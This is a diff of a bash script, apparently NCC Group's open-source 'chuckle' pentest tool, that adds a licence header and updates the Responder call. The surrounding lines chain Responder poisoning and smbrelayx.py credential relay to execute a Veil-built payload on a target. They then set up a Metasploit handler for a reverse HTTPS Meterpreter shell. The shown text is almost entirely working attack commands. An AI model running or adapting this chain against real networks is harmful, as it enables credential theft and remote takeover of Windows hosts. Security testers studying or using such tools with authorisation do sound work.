@@ -1,3 +1,13 @@
+#Released as open source by NCC Group Plc - http://www.nccgroup.com/
+#
+#Developed by Craig S. Blackie, craig dot blackie@nccgroup dot trust
+#
+#http://www.github.com/nccgroup/chuckle
+#
+#Copyright 2015 Craig S. Blackie
+#
+#Released under Apache V2 see LICENCE for more information
+#
 #!/bin/bash
 #Requires Nmap, Responder, SMBRelayX, Latest version of Veil, metasploit.
 trap 'kill $(jobs -p)'  EXIT
@@ -46,7 +56,10 @@ echo "Payload created: $payload"
 echo "Starting SMBRelayX..."
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
 echo "Stating Responder..."
-responder -i $lhost -wrfF >>chuckle.log &
+#responder -i $lhost -wrfF >>chuckle.log &
+#Fix for new responder options.
+responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}'
+) -wrfF >>chuckle.log &
 echo "Setting up listener..."
 echo "use exploit/multi/handler" > chuckle.rc
 echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
